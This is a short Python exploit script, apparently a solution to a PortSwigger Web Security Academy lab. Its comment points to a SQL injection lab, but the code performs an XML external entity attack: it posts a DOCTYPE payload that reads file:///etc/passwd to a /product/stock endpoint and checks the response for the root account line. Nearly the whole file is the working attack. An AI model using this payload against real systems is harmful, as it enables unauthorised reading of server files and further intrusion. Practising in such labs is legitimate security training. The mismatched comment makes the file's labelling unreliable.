import requests
import argparse
import re

# https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. E.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to specify a target.")
    print("[*] Example usage: sqli-union-text.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test the connection to the target and get the random string we need
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
else:
    print('[!] Target seems down')
    exit(0)

# create the payload
payload = args.target + "/product/stock"
payload_data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
print('[*] Target created: ' + payload)
print('[*] Payload created: ' + payload_data)

r = requests.post(payload, data=payload_data)
if r.status_code == 400:
    print('[*] Payload sent')
    # check the contents of the file
    completion_text = 'root:x:0:0:root:/root:/bin/bash'
    if completion_text in r.text:
        print('[*] Success')
    else:
        print('[!] Exploit failed')
        exit(0)
else:
    print('[!] Exploit failed')
    exit(0)
